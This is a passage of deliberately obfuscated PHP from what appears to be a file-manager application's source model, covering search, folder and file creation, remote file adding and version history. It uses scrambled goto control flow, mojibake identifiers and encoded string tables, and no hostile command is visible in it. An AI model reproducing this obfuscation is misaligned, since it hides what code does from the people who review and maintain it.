$eß¥ñš¤“[] = $F«ó˜‘¯áÆ[$D´šêÅ”Õ»[367]]; } } goto B°ó¸•Àí; a•ê¢ŒÊš„: $D´šêÅ”Õ» =& $_SERVER[Î¿—”òá]; if (!$D¥‰¥”Í‹[$D´šêÅ”Õ»[2175]] || $d•É»ğ—ƒ¤[$D´šêÅ”Õ»[351]][$D´šêÅ”Õ»[340]] > 1) { return; } $DÈ·©‰æëÈ = Model($D´šêÅ”Õ»[2310])->listData(); goto fÓò†ëâ¹Ò; FÚ¶‘¬ˆ§: } private function _listSearchDesc(&$aáóÜƒÉŠä, $AÒ‘¹êÃ®˜, $b³ÊÉ’ÙÌå) { goto d¤“®ĞÏ; eìÒë„…Ä: $f‰Ğë×²·÷ = Model($e°ƒ¿òÁ©ò[504])->field($e°ƒ¿òÁ©ò[369])->where($bÑŸŸ‡ïµ)->select(); $cÙÍğÍîØ = array_to_keyvalue($f‰Ğë×²·÷, $e°ƒ¿òÁ©ò[33], $e°ƒ¿òÁ©ò[369]); $this->_listSearchMerge($aáóÜƒÉŠä, $AÒ‘¹êÃ®˜, $b³ÊÉ’ÙÌå, $cÙÍğÍîØ); goto dØÎÏ³¸òø; d¤“®ĞÏ: $e°ƒ¿òÁ©ò =& $_SERVER[Î¿—”òá]; if (!$AÒ‘¹êÃ®˜[$e°ƒ¿òÁ©ò[2175]] || $aáóÜƒÉŠä[$e°ƒ¿òÁ©ò[351]][$e°ƒ¿òÁ©ò[340]] > 1) { return; } $f¢ï±î§Üï = $this->listSearchChildren($AÒ‘¹êÃ®˜[$e°ƒ¿òÁ©ò[461]]); goto c’Äº÷¢¸; c’Äº÷¢¸: $f¢ï±î§Üï = array_unique($f¢ï±î§Üï); if (!$f¢ï±î§Üï) { return; } $bÑŸŸ‡ïµ = array($e°ƒ¿òÁ©ò[369] => array($e°ƒ¿òÁ©ò[7], $f¢ï±î§Üï), $e°ƒ¿òÁ©ò[89] => $e°ƒ¿òÁ©ò[405], $e°ƒ¿òÁ©ò[359] => array($e°ƒ¿òÁ©ò[748], $e°ƒ¿òÁ©ò[2177] . $AÒ‘¹êÃ®˜[$e°ƒ¿òÁ©ò[2175]] . $e°ƒ¿òÁ©ò[2177])); goto eìÒë„…Ä; dØÎÏ³¸òø: } private function _listSearchMerge(&$BÑä†­íÔ, $aùËò“¼˜, $eÀŞÁ†·ñ”, $Dœ¥Ä„¢) { goto b‚ï–ì²ÀÑ; b‚ï–ì²ÀÑ: $cÑÚùêëËÂ =& $_SERVER[Î¿—”òá]; if (!$Dœ¥Ä„¢) { return; } $E¨¨¬£†Ì = array_to_keyvalue($BÑä†­íÔ[$cÑÚùêëËÂ[354]], $cÑÚùêëËÂ[33], $cÑÚùêëËÂ[369]); goto AÒ“„ô¦ „; AÒ“„ô¦ „: $cÍ˜ë¥“Õ = array_diff($Dœ¥Ä„¢, $E¨¨¬£†Ì); if (!$cÍ˜ë¥“Õ) { return; } $AÆ…‰“‘õµ = array($cÑÚùêëËÂ[369] => array($cÑÚùêëËÂ[7], $cÍ˜ë¥“Õ)); goto b¹·åÀçÄ; b¹·åÀçÄ: $bÈ°™Ç„† = $this->field($eÀŞÁ†·ñ”)->where($AÆ…‰“‘õµ)->select(); if (!$bÈ°™Ç„†) { return; } $D™äğÀ¨îÄ = array(); goto f‘Ã”ä¯Õ; f‘Ã”ä¯Õ: foreach ($bÈ°™Ç„† as $aä¡÷““Úî) { $Bœô™¢Ùò = $cÑÚùêëËÂ[47] . $aùËò“¼˜[$cÑÚùêëËÂ[461]] . $cÑÚùêëËÂ[47]; if (stripos($aä¡÷““Úî[$cÑÚùêëËÂ[459]], $Bœô™¢Ùò) !== !1) { $D™äğÀ¨îÄ[] = $aä¡÷““Úî; } } $BÑä†­íÔ[$cÑÚùêëËÂ[354]] = array_merge($D™äğÀ¨îÄ, $BÑä†­íÔ[$cÑÚùêëËÂ[354]]); $BÑä†­íÔ[$cÑÚùêëËÂ[351]][$cÑÚùêëËÂ[352]] += count($D™äğÀ¨îÄ); goto CÁëÔ¸íÇ’; CÁëÔ¸íÇ’: } public function listSearchChildren($DĞÄéïÌñé, $AïÙ—ÔóÆ¥ = 5000) { goto D¢Í¨ÜàÊ; bÏ©×êÖŒŠ: $cµÜİ£ÀÚè = array($dãô¾µ­¬±[459] => array($dãô¾µ­¬±[748], $FÑ‡‚¤Ã¶[$dãô¾µ­¬±[459]] . $FÑ‡‚¤Ã¶[$dãô¾µ­¬±[369]] . $dãô¾µ­¬±[484])); $dÀòÂŒÀ‹º = $this->field($dãô¾µ­¬±[369])->cache(null, 600)->where($cµÜİ£ÀÚè)->count(); if ($dÀòÂŒÀ‹º > $AïÙ—ÔóÆ¥) { return $this->_listSearchChildrenNear($DĞÄéïÌñé, $AïÙ—ÔóÆ¥); } goto fÖÍ¿¶Æ¬²; fÖÍ¿¶Æ¬²: $A ‚¾ÁË´ = $this->field($dãô¾µ­¬±[369])->where($cµÜİ£ÀÚè)->select(); $f êÕºî = array_to_keyvalue($A ‚¾ÁË´, $dãô¾µ­¬±[33], $dãô¾µ­¬±[369]); return $f êÕºî; goto DÔ—‹ôÂ†; D¢Í¨ÜàÊ: $dãô¾µ­¬± =& $_SERVER[Î¿—”òá]; $f êÕºî = array(); $FÑ‡‚¤Ã¶ = $this->sourceInfo($DĞÄéïÌñé); goto bÏ©×êÖŒŠ; DÔ—‹ôÂ†: } private function _listSearchChildrenNear($F‹îåœó„ò, $Fô’¯ùÔë) { goto cŸíª¡Ò¤; f–çèÏê: $Eê‘Ú­Â¿  = $this->field($cìáãÜ±à›[2311])->where($cœ øáÜÔµ)->select(); $EùóäÜ¹Ä½ = array_to_keyvalue(array_filter_by_field($Eê‘Ú­Â¿ , $cìáãÜ±à›[370], $cìáãÜ±à›[83]), $cìáãÜ±à›[33], $cìáãÜ±à›[369]); $cø‹Œ‡Â¬  = array_merge($cø‹Œ‡Â¬ , array_to_keyvalue($Eê‘Ú­Â¿ , $cìáãÜ±à›[33], $cìáãÜ±à›[369])); goto B¯Óïø¤ºÔ; cŸíª¡Ò¤: $cìáãÜ±à› =& $_SERVER[Î¿—”òá]; $cø‹Œ‡Â¬  = array(); $cœ øáÜÔµ = array($cìáãÜ±à›[461] => $F‹îåœó„ò); goto f–çèÏê; bæºÂ“Š·: $cø‹Œ‡Â¬  = array_merge($cø‹Œ‡Â¬ , array_to_keyvalue($Eê‘Ú­Â¿ , $cìáãÜ±à›[33], $cìáãÜ±à›[369])); $cø‹Œ‡Â¬  = array_slice($cø‹Œ‡Â¬ , 0, $Fô’¯ùÔë); return $cø‹Œ‡Â¬ ; goto DÎÅõĞ˜Òµ; B¯Óïø¤ºÔ: if (!$EùóäÜ¹Ä½) { return $cø‹Œ‡Â¬ ; } $cœ øáÜÔµ = array($cìáãÜ±à›[461] => array($cìáãÜ±à›[7], $EùóäÜ¹Ä½)); $Eê‘Ú­Â¿  = $this->field($cìáãÜ±à›[2311])->where($cœ øáÜÔµ)->select(); goto bæºÂ“Š·; DÎÅõĞ˜Òµ: } private function _listSearchBindPinyin($AñšÉ®œàÀ, &$dŒÔ©’¨È, &$FØµœ…ŞØ) { goto e³®·íÎ”; càÃÄœ¼‚Ç: $DßˆŸô“ï¶[] = array($A˜¿Ó§·µŸ[2315] => $D¼¡‡‘¡áŞ, $A˜¿Ó§·µŸ[907] => $A˜¿Ó§·µŸ[2179], array($A˜¿Ó§·µŸ[2316] => $D¼¡‡‘¡áŞ, $A˜¿Ó§·µŸ[2317] => array($A˜¿Ó§·µŸ[7], array($A˜¿Ó§·µŸ[416], $A˜¿Ó§·µŸ[415])))); $this->join($e„¤“Ö‚Õ™); $dŒÔ©’¨È = $DßˆŸô“ï¶; goto EØá¯ŞŸé”; D¹Ü‹«ÒÕí: unset($dŒÔ©’¨È[$A˜¿Ó§·µŸ[28]]); foreach ($dŒÔ©’¨È as $bâİ”Ü¾ïà => $D›Îçï¼œ) { $DßˆŸô“ï¶[$A˜¿Ó§·µŸ[2313] . $bâİ”Ü¾ïà] = $D›Îçï¼œ; } $D¼¡‡‘¡áŞ = array($A˜¿Ó§·µŸ[483], $A˜¿Ó§·µŸ[2177] . $AñšÉ®œàÀ[$A˜¿Ó§·µŸ[2175]] . $A˜¿Ó§·µŸ[2177]); goto càÃÄœ¼‚Ç; e³®·íÎ”: $A˜¿Ó§·µŸ =& $_SERVER[Î¿—”òá]; if (!Input::check($AñšÉ®œàÀ[$A˜¿Ó§·µŸ[2175]], $A˜¿Ó§·µŸ[306]) || strlen($AñšÉ®œàÀ[$A˜¿Ó§·µŸ[2175]]) < 2) { return; } $e„¤“Ö‚Õ™ = "\114\x45\106\x54\x20\112\117\x49\x4e\40{$this->tablePrefix}\151\157\137\x73\157\x75\162\143\145\x5f\155\x65\x74\x61\x20\155\x65\164\x61\x20\157\156\40\x73\x6f\165\162\143\x65\x2e\x73\x6f\x75\x72\x63\x65\111\x44\x20\75\40\x6d\145\x74\x61\x2e\163\157\165\162\x63\145\x49\104"; goto DÛùÅÇ¬æÃ; DÛùÅÇ¬æÃ: $DßˆŸô“ï¶ = array(); $FØµœ…ŞØ = str_replace(array($A˜¿Ó§·µŸ[217], $A˜¿Ó§·µŸ[50], $A˜¿Ó§·µŸ[2312]), $A˜¿Ó§·µŸ[33], $FØµœ…ŞØ); $FØµœ…ŞØ = $A˜¿Ó§·µŸ[2313] . str_replace($A˜¿Ó§·µŸ[47], $A˜¿Ó§·µŸ[2314], $FØµœ…ŞØ); goto D¹Ü‹«ÒÕí; EØá¯ŞŸé”: } private function _parseSearchWhere($Aï®²Å¿³á) { goto CŒÒ›¿äóÇ; CŒÒ›¿äóÇ: $BÔ‚È‚º¤ =& $_SERVER[Î¿—”òá]; $C»ÜÍ…îâÜ = array(); if (isset($Aï®²Å¿³á[$BÔ‚È‚º¤[698]])) { $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[107]] = array($BÔ‚È‚º¤[2318], $Aï®²Å¿³á[$BÔ‚È‚º¤[698]]); } goto BõĞóäÉÉØ; c½„ ˆ¬‚ù: if (isset($Aï®²Å¿³á[$BÔ‚È‚º¤[535]])) { $C»ÜÍ…îâÜ[] = array($BÔ‚È‚º¤[379] => $Aï®²Å¿³á[$BÔ‚È‚º¤[535]], $BÔ‚È‚º¤[378] => $Aï®²Å¿³á[$BÔ‚È‚º¤[535]], $BÔ‚È‚º¤[907] => $BÔ‚È‚º¤[2179]); } if (isset($Aï®²Å¿³á[$BÔ‚È‚º¤[372]])) { $E®ÌĞƒ¿Í = $Aï®²Å¿³á[$BÔ‚È‚º¤[372]]; if ($E®ÌĞƒ¿Í == $BÔ‚È‚º¤[76]) { $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[370]] = 1; } else { if ($E®ÌĞƒ¿Í == $BÔ‚È‚º¤[2323]) { $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[370]] = 0; } else { if ($E®ÌĞƒ¿Í) { $E®ÌĞƒ¿Í = is_array($E®ÌĞƒ¿Í) ? $E®ÌĞƒ¿Í : explode($BÔ‚È‚º¤[47], $E®ÌĞƒ¿Í); $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[372]] = array($BÔ‚È‚º¤[384], $E®ÌĞƒ¿Í); $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[370]] = 0; } } } } if (isset($Aï®²Å¿³á[$BÔ‚È‚º¤[461]])) { $FìÂÎ„ø÷í = $this->sourceInfo($Aï®²Å¿³á[$BÔ‚È‚º¤[461]]); $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[525]] = array($BÔ‚È‚º¤[483], $FìÂÎ„ø÷í[$BÔ‚È‚º¤[459]] . $Aï®²Å¿³á[$BÔ‚È‚º¤[461]] . $BÔ‚È‚º¤[484]); } goto b¨™Š¬Õ‡¦; b¨™Š¬Õ‡¦: if (isset($Aï®²Å¿³á[$BÔ‚È‚º¤[2175]]) && $Aï®²Å¿³á[$BÔ‚È‚º¤[2175]]) { $bÇÔ¬ÅÇÓÜ = $Aï®²Å¿³á[$BÔ‚È‚º¤[2175]]; $f±É“Œ„î = explode($BÔ‚È‚º¤[50], $bÇÔ¬ÅÇÓÜ); if (strlen($bÇÔ¬ÅÇÓÜ) > 2 && (substr($bÇÔ¬ÅÇÓÜ, 0, 1) == $BÔ‚È‚º¤[113] && substr($bÇÔ¬ÅÇÓÜ, -1) == $BÔ‚È‚º¤[113]) || substr($bÇÔ¬ÅÇÓÜ, 0, 1) == $BÔ‚È‚º¤[55] && substr($bÇÔ¬ÅÇÓÜ, -1) == $BÔ‚È‚º¤[55]) { $bÇÔ¬ÅÇÓÜ = substr($bÇÔ¬ÅÇÓÜ, 1, -1); $f±É“Œ„î = array($bÇÔ¬ÅÇÓÜ); } $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[28]] = array($BÔ‚È‚º¤[483], $BÔ‚È‚º¤[2177] . $bÇÔ¬ÅÇÓÜ . $BÔ‚È‚º¤[2177]); if (count($f±É“Œ„î) > 1) { $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[28]] = array(); foreach ($f±É“Œ„î as $bÃ“øËÆ) { if (!trim($bÃ“øËÆ)) { continue; } $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[28]][] = array($BÔ‚È‚º¤[483], $BÔ‚È‚º¤[2177] . trim($bÃ“øËÆ) . $BÔ‚È‚º¤[2177]); } } } return $C»ÜÍ…îâÜ; goto FÑÁ³¶; BõĞóäÉÉØ: if (isset($Aï®²Å¿³á[$BÔ‚È‚º¤[699]])) { $aÓƒ®¡½—À = array($BÔ‚È‚º¤[2319], $Aï®²Å¿³á[$BÔ‚È‚º¤[699]]); if ($C»ÜÍ…îâÜ[$BÔ‚È‚º¤[107]]) { $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[107]] = array($C»ÜÍ…îâÜ[$BÔ‚È‚º¤[107]], $aÓƒ®¡½—À, $BÔ‚È‚º¤[2320]); } else { $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[107]] = $aÓƒ®¡½—À; } } if (isset($Aï®²Å¿³á[$BÔ‚È‚º¤[2321]])) { $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[77]] = array($BÔ‚È‚º¤[2318], $Aï®²Å¿³á[$BÔ‚È‚º¤[2321]]); } if (isset($Aï®²Å¿³á[$BÔ‚È‚º¤[2322]])) { $aÓƒ®¡½—À = array($BÔ‚È‚º¤[2319], $Aï®²Å¿³á[$BÔ‚È‚º¤[2322]]); if ($C»ÜÍ…îâÜ[$BÔ‚È‚º¤[77]]) { $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[77]] = array($C»ÜÍ…îâÜ[$BÔ‚È‚º¤[77]], $aÓƒ®¡½—À, $BÔ‚È‚º¤[2320]); } else { $C»ÜÍ…îâÜ[$BÔ‚È‚º¤[77]] = $aÓƒ®¡½—À; } } goto c½„ ˆ¬‚ù; FÑÁ³¶: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($båÏµ¸¯‹º) { $d×©²‚Ÿï =& $_SERVER[Î¿—”òá]; $f¥ÛÜ¥Îö = Model($d×©²‚Ÿï[474])->where(array($d×©²‚Ÿï[1420] => $båÏµ¸¯‹º))->find(); $bˆÑ¾ñå±Æ = $this->_mkdirRoot(SourceModel::TYPE_USER, $båÏµ¸¯‹º, $f¥ÛÜ¥Îö[$d×©²‚Ÿï[28]]); $this->userDesktopAdd($bˆÑ¾ñå±Æ); return $bˆÑ¾ñå±Æ; } public function userDesktopAdd($e®¹Œâ¹Âˆ) { $cß¹ç¢­½Ñ =& $_SERVER[Î¿—”òá]; $bÑØØ´ÀØ = LNG($cß¹ç¢­½Ñ[2324]); $B¢Í¨ÅÚ›— = $this->mkdir($e®¹Œâ¹Âˆ, $bÑØØ´ÀØ); $this->metaSet($B¢Í¨ÅÚ›—, $cß¹ç¢­½Ñ[2325], $cß¹ç¢­½Ñ[83]); $this->metaSet($e®¹Œâ¹Âˆ, $cß¹ç¢­½Ñ[2326], $B¢Í¨ÅÚ›—); } public function groupRootAdd($eçàƒ‰¯´) { $B…õÑ¬ÖùÓ =& $_SERVER[Î¿—”òá]; $F´£œŸ÷ = Model($B…õÑ¬ÖùÓ[458])->where(array($B…õÑ¬ÖùÓ[2171] => $eçàƒ‰¯´))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $eçàƒ‰¯´, $F´£œŸ÷[$B…õÑ¬ÖùÓ[28]]); } public function systemRootPathAdd($c†’À¡ƒİÜ) { if ($c†’À¡ƒİÜ != $_SERVER[Î¿—”òá][1082]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $c†’À¡ƒİÜ); } public function userRootRemove($aæÈÏÄøµÀ) { $a¶Ÿ´ÉÜì = $this->sourceRoot(SourceModel::TYPE_USER, $aæÈÏÄøµÀ); if (!$a¶Ÿ´ÉÜì) { return; } $this->remove($a¶Ÿ´ÉÜì, !1); } public function groupRootRemove($F¼±¬ÚÁˆ·) { $BŒ”‡Õô½ = $this->sourceRoot(SourceModel::TYPE_GROUP, $F¼±¬ÚÁˆ·); if (!$BŒ”‡Õô½) { return; } $this->remove($BŒ”‡Õô½, !1); } private function _mkdirRoot($bã®ùÖŒéô, $f—Ïå‰ò…¸, $c À÷ˆŞÓ) { goto EÙñ±µ¨Šƒ; D×øŒƒ¿¦ô: CacheLock::unlock($d‹ù‰ßå…); return $DÂÆŒÓİÇ; goto EŒâŞœÕ¿÷; EÙñ±µ¨Šƒ: $c¹¥ò‡‹Òê =& $_SERVER[Î¿—”òá]; $c±¹Ô©ô¸é = array($c¹¥ò‡‹Òê[368] => 0, $c¹¥ò‡‹Òê[521] => $bã®ùÖŒéô, $c¹¥ò‡‹Òê[522] => $f—Ïå‰ò…¸, $c¹¥ò‡‹Òê[518] => 1, $c¹¥ò‡‹Òê[523] => USER_ID, $c¹¥ò‡‹Òê[524] => USER_ID, $c¹¥ò‡‹Òê[519] => $c¹¥ò‡‹Òê[33], $c¹¥ò‡‹Òê[525] => $c¹¥ò‡‹Òê[470], $c¹¥ò‡‹Òê[396] => 0, $c¹¥ò‡‹Òê[520] => 0, $c¹¥ò‡‹Òê[420] => 0, $c¹¥ò‡‹Òê[526] => $c¹¥ò‡‹Òê[33]); if ($eğÏåğÚŒó = $this->where($c±¹Ô©ô¸é)->find()) { return $eğÏåğÚŒó[$c¹¥ò‡‹Òê[369]]; } goto FáõŠ¿œµÂ; FáõŠ¿œµÂ: $d‹ù‰ßå… = "\x4d\157\144\x65\x6c\123\157\x75\x72\x63\145\x2e\x6d\x6b\x64\x69\162\122\x6f\x6f\164\x2e{$bã®ùÖŒéô}\x2e{$f—Ïå‰ò…¸}\56" . $c À÷ˆŞÓ; CacheLock::lock($d‹ù‰ßå…); $c±¹Ô©ô¸é[$c¹¥ò‡‹Òê[28]] = $c À÷ˆŞÓ; goto e†“•¦ÌÏÉ; e†“•¦ÌÏÉ: $DÂÆŒÓİÇ = $this->add($c±¹Ô©ô¸é); $A÷Œø…»¯¨ = array($c¹¥ò‡‹Òê[527] => short_id($DÂÆŒÓİÇ)); $this->where(array($c¹¥ò‡‹Òê[383] => $DÂÆŒÓİÇ))->save($A÷Œø…»¯¨); goto D×øŒƒ¿¦ô; EŒâŞœÕ¿÷: } private function sourceRoot($a˜»ªÔíì, $EØƒçÉÀÜŠ, $Bñõ©­Æ = false) { $A°·ÑÙ°ë“ =& $_SERVER[Î¿—”òá]; $BËùãÄ‡”‰ = array($A°·ÑÙ°ë“[368] => 0, $A°·ÑÙ°ë“[521] => $a˜»ªÔíì, $A°·ÑÙ°ë“[522] => $EØƒçÉÀÜŠ); if ($dÅÔÛ–ÖÂì = $this->where($BËùãÄ‡”‰)->find()) { return $Bñõ©­Æ ? $dÅÔÛ–ÖÂì : $dÅÔÛ–ÖÂì[$A°·ÑÙ°ë“[369]]; } return !1; } public function sourceRootGroup($dŞ½¥Ñã¤”) { $eæí¸™Åáò =& $_SERVER[Î¿—”òá]; if (is_string($dŞ½¥Ñã¤”)) { $dŞ½¥Ñã¤” = array($dŞ½¥Ñã¤”); } $Dƒ™Ûà„³ = array($eæí¸™Åáò[368] => 0, $eæí¸™Åáò[521] => SourceModel::TYPE_GROUP, $eæí¸™Åáò[522] => array($eæí¸™Åáò[7], $dŞ½¥Ñã¤”)); $aî³ø„†† = $this->listSource($Dƒ™Ûà„³, 1000); return array_to_keyvalue($aî³ø„††[$eæí¸™Åáò[74]], $eæí¸™Åáò[456]); } public function mkfile($E²·÷“£, $C‡¹‡”ÈÓ£, $có”„Ì‰œ³ = '', $CŒä„ÒÇøõ = REPEAT_RENAME) { $bªä‰œ°× =& $_SERVER[Î¿—”òá]; $BŒĞ¤š¿ø = Model($bªä‰œ°×[544])->addFileByContent($có”„Ì‰œ³, $C‡¹‡”ÈÓ£); return $this->_createFileCall($E²·÷“£, $C‡¹‡”ÈÓ£, $BŒĞ¤š¿ø, $CŒä„ÒÇøõ, $bªä‰œ°×[1119]); } public function addFile($C•˜œ£¿†, $BÃé¡Ç„’ê, $bµ°½Ùå‘š, $fæêğ½„æÌ = false, $D¥Ïƒô×Í = REPEAT_RENAME) { $bŠ‹ØÛÂŒ = Model($_SERVER[Î¿—”òá][544])->addFile($BÃé¡Ç„’ê, $bµ°½Ùå‘š, $fæêğ½„æÌ); return $this->_createFileCall($C•˜œ£¿†, $bµ°½Ùå‘š, $bŠ‹ØÛÂŒ, $D¥Ïƒô×Í); } public function addFileByFileID($F´¼…òÅ´, $dÕÑÉ¬¿‹Î, $B‡Íƒ’Ù, $f›¤ÔÍÀ´ñ = REPEAT_RENAME) { $c¾±Ã© =& $_SERVER[Î¿—”òá]; $D™¹Ğ•¯øõ = Model($c¾±Ã©[544])->find($dÕÑÉ¬¿‹Î); Model($c¾±Ã©[544])->linkAdd($dÕÑÉ¬¿‹Î); return $this->_createFileCall($F´¼…òÅ´, $B‡Íƒ’Ù, $D™¹Ğ•¯øõ, $f›¤ÔÍÀ´ñ); } public function addFileByRemote($B¬ËéˆÈ, $Aç¤µ¶×À, $Aœ†¤ùÑš‡, $dø–ïÑ†·‰ = array(), $FäÁÉó°îƒ = REPEAT_RENAME) { $C“”™öÀˆå = Model($_SERVER[Î¿—”òá][544])->addFileByRemote($Aç¤µ¶×À, $Aœ†¤ùÑš‡, $dø–ïÑ†·‰); return $this->_createFileCall($B¬ËéˆÈ, $Aœ†¤ùÑš‡, $C“”™öÀˆå, $FäÁÉó°îƒ); } private function _createFileCall($EÄÛ©­é‚, $CæœÅ¡¹á¦, $A §‹—›óà, $d¢¦¤õ˜ãÅ, $D•¸éã…ÇÍ = "\165\x70\x6c\x6f\141\144") { goto DŠ¤ŠÙÛ¹; dÄÊ‹ßê¥: return $eÔ†õ—ùÌ”; goto BèŒ…çĞ¥Á; DŠ¤ŠÙÛ¹: $fŠæÈéØéÜ =& $_SERVER[Î¿—”òá]; $CÖßŒ»Ğ‹Ÿ = !1; $this->lockWriteStart($EÄÛ©­é‚, $CæœÅ¡¹á¦); goto B÷É´¿¸æ; B÷É´¿¸æ: $eÔ†õ—ùÌ” = $this->_createFile($EÄÛ©­é‚, $CæœÅ¡¹á¦, $A §‹—›óà, $d¢¦¤õ˜ãÅ, $CÖßŒ»Ğ‹Ÿ); if (!$CÖßŒ»Ğ‹Ÿ) { Model($fŠæÈéØéÜ[422])->remove($A §‹—›óà[$fŠæÈéØéÜ[419]]); } else { if ($eÔ†õ—ùÌ”) { Model($fŠæÈéØéÜ[2297])->eventCreate($eÔ†õ—ùÌ”, $D•¸éã…ÇÍ); } } $this->lockWriteEnd($EÄÛ©­é‚, $CæœÅ¡¹á¦); goto dÄÊ‹ßê¥; BèŒ…çĞ¥Á: } public function mkdir($eÁáƒ‡­÷ , $E½µÃ‡é, $bÄæÜ¡ëÄ‹ = REPEAT_SKIP) { goto fß¥òñ‚å; fß¥òñ‚å: $AŸİ§’ÕÂ =& $_SERVER[Î¿—”òá]; $dßœæŠíÂ = $this->sourceInfo($eÁáƒ‡­÷ ); if (!$dßœæŠíÂ) { return !1; } goto C‰˜œÕšùÏ; F…ß¾ÇÕ¢: $D¬«Ó“Óˆ = $this->_addSoure($eÀØöÎï•è, $dßœæŠíÂ); Model($AŸİ§’ÕÂ[2297])->eventCreate($D¬«Ó“Óˆ, $AŸİ§’ÕÂ[1120]); $this->lockWriteEnd($eÁáƒ‡­÷ , $E½µÃ‡é); goto BŠÅÇ¶ë‹÷; BŠÅÇ¶ë‹÷: return $D¬«Ó“Óˆ; goto B—¹£—å§Ú; C‰˜œÕšùÏ: $this->lockWriteStart($eÁáƒ‡­÷ , $E½µÃ‡é); if ($bÄæÜ¡ëÄ‹ !== !1) { $c±—ÍÙŞ–‰ = $this->fileNameExist($eÁáƒ‡­÷ , $E½µÃ‡é); if ($c±—ÍÙŞ–‰ && $bÄæÜ¡ëÄ‹ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($eÁáƒ‡­÷ , $E½µÃ‡é); return $c±—ÍÙŞ–‰; } $E½µÃ‡é = $this->fileNameAuto($eÁáƒ‡­÷ , $E½µÃ‡é, $bÄæÜ¡ëÄ‹); } $eÀØöÎï•è = array($AŸİ§’ÕÂ[518] => 1, $AŸİ§’ÕÂ[386] => $E½µÃ‡é, $AŸİ§’ÕÂ[519] => $AŸİ§’ÕÂ[33], $AŸİ§’ÕÂ[420] => 0, $AŸİ§’ÕÂ[520] => 0); goto F…ß¾ÇÕ¢; B—¹£—å§Ú: } private function _createFile($D¡âñ†¾‡Ö, $a‰ŠÑŠßê©, $aÆ‰Óôèé, $FŞ¸”ƒ’¦Ê, &$dµõ™Ö«—) { goto d²…«Ö’ª; d²…«Ö’ª: $e†–¡·‘É =& $_SERVER[Î¿—”òá]; $A”œÏ«êÅˆ = $this->sourceInfo($D¡âñ†¾‡Ö); if (!$aÆ‰Óôèé || !$A”œÏ«êÅˆ) { return !1; } goto f¦í“‚²†Š; dÆ´Ó¢À£…: return $Bö™¯¨›¶ò; goto a‹´ƒÍö·’; f¦í“‚²†Š: if ($FŞ¸”ƒ’¦Ê !== !1) { $FÓÉà ŠØÉ = $this->fileNameExist($D¡âñ†¾‡Ö, $a‰ŠÑŠßê©); } $dµõ™Ö«— = !0; if ($FŞ¸”ƒ’¦Ê && $FÓÉà ŠØÉ) { if ($FŞ¸”ƒ’¦Ê == REPEAT_SKIP) { $dµõ™Ö«— = !1; return $FÓÉà ŠØÉ; } else { if ($FŞ¸”ƒ’¦Ê == REPEAT_REPLACE) { $cª‰šïø´í = $this->sourceInfo($FÓÉà ŠØÉ); $D®à·„•˜  = $this->fileHistory($cª‰šïø´í, $aÆ‰Óôèé[$e†–¡·‘É[419]], $aÆ‰Óôèé[$e†–¡·‘É[77]]); if (!$D®à·„•˜ ) { $dµõ™Ö«— = !1; } else { $this->folderSizeReset($D¡âñ†¾‡Ö); } return $FÓÉà ŠØÉ; } else { $a‰ŠÑŠßê© = $this->fileNameAuto($D¡âñ†¾‡Ö, $a‰ŠÑŠßê©, $FŞ¸”ƒ’¦Ê, !1); } } } goto e‡¬Ë„Ÿé; e‡¬Ë„Ÿé: $cÎ“Ş°Áçî = array($e†–¡·‘É[518] => 0, $e†–¡·‘É[386] => $a‰ŠÑŠßê©, $e†–¡·‘É[519] => get_path_ext($a‰ŠÑŠßê©), $e†–¡·‘É[420] => $aÆ‰Óôèé[$e†–¡·‘É[419]], $e†–¡·‘É[520] => $aÆ‰Óôèé[$e†–¡·‘É[77]]); $Bö™¯¨›¶ò = $this->_addSoure($cÎ“Ş°Áçî, $A”œÏ«êÅˆ); $this->folderSizeReset($D¡âñ†¾‡Ö); goto dÆ´Ó¢À£…; a‹´ƒÍö·’: } protected function fileHistory($C…éñ¥§ˆè, $a¢Ëöçëƒç, $B‹ËÌ³ë) { goto Aœ±ÈœğÏ; bÜôÛõãÊ¦: Model($FŠò•ÌĞ…Ä[2327])->addHistory($C…éñ¥§ˆè); $FğÖÔ´­î = array($FŠò•ÌĞ…Ä[524] => USER_ID, $FŠò•ÌĞ…Ä[390] => time(), $FŠò•ÌĞ…Ä[419] => $a¢Ëöçëƒç, $FŠò•ÌĞ…Ä[77] => $B‹ËÌ³ë); $this->where(array($FŠò•ÌĞ…Ä[383] => $C…éñ¥§ˆè[$FŠò•ÌĞ…Ä[369]]))->save($FğÖÔ´­î); goto bÙéÈ¶ÇÂ; Aœ±ÈœğÏ: $FŠò•ÌĞ…Ä =& $_SERVER[Î¿—”òá]; if ($C…éñ¥§ˆè[$FŠò•ÌĞ…Ä[419]] == $a¢Ëöçëƒç) { return !1; } $this->checkLock($C…éñ¥§ˆè[$FŠò•ÌĞ…Ä[369]], $a¢Ëöçëƒç); goto bÜôÛõãÊ¦; bÙéÈ¶ÇÂ: return !0; goto b¡”ÏìŒô”; b¡”ÏìŒô”: } public function checkLock($A™“¯§‰¢ô, $aæÍ¯¹”Ô¸) { goto A‚¼ŸŒÖí; A‚¼ŸŒÖí: $eÕäŠ³®³ =& $_SERVER[Î¿—”òá]; $føí¶½±îí = $this->pathInfo($A™“¯§‰¢ô); if (!$this->fileIsLock($føí¶½±îí, !0)) { return; } goto Câì„ ÷¼Ã; Eñ½Ü¿ª‘Õ: $this->_createFileCall($føí¶½±îí[$eÕäŠ³®³[461]], $b ¿¶›ßó¿, $f„¾÷Ì©Ó, REPEAT_REPLACE, $eÕäŠ³®³[1119]); $Eø®ˆ„Ùï = $føí¶½±îí[$eÕäŠ³®³[417]][$eÕäŠ³®³[481]]; $dÈ˜Í£±Œ = $Eø®ˆ„Ùï[$eÕäŠ³®³[2329]] ? 